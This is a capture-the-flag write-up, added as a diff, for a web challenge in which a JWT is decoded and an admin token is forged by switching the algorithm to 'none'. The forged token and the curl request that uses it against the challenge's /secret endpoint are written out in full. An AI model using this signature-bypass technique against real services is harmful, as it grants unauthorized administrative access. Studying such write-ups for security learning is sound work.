@@ -1,0 +1,28 @@
+Web Security: Medium
+None Shall Pass
+
+http://34.85.163.182:8080/login.html
+
+Deep inside Juche Jaguar’s intranet runs a custom token‐based gateway protecting their most sensitive files at /secret. We got our hands on a low‐privilege account (user:pass = agent:spudpotato) - use it to request an access token, then find a way to trick the gateway into granting you full admin rights and pull down the hidden intelligence (the flag) from /secret. Good luck, Operative.
+
+Token given: 
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0OTkyODI1NiwiZXhwIjoxNzQ5OTMxODU2fQ. XUkIqc6oRyhYby4xyjr-P7tLpCPLY689aeLKOQ9eNhY
+
+With CyberChef from Base64:
+
+{"alg":"HS256","typ":"JWT"}
+
+{"user":"agent","role":"user","iat":1749928256,"exp":1749931856}
+
+Use this to construct our admin login:
+
+{"alg":"none","typ":"JWT"} = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+{"user":"agent","role":"admin","iat":1749928256,"exp":1749931856} = eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDk5MjgyNTYsImV4cCI6MTc0OTkzMTg1Nn0
+
+and run:
+
+curl -v -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDk5MjgyNTYsImV4cCI6MTc0OTkzMTg1Nn0." http://34.85.163.182:8080/secret
+
+Which gives us access to the site, and the flag!
